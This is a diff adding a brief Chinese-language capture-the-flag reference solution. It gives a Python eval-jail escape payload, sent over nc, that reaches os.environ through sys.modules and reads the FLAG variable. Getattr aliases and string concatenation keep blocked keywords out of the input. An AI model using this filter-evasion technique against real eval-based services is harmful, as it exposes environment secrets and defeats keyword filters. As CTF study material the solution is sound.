@@ -1,0 +1,5 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+# S 是 sys 别名：sys.modules 挖出 os；
+# 全程 G 别名调用 + 拼接，源码里无任何敏感整词
+G(G(S, 'mo'+'dules')['o'+'s'], 'envi'+'ron')['F'+'LAG']
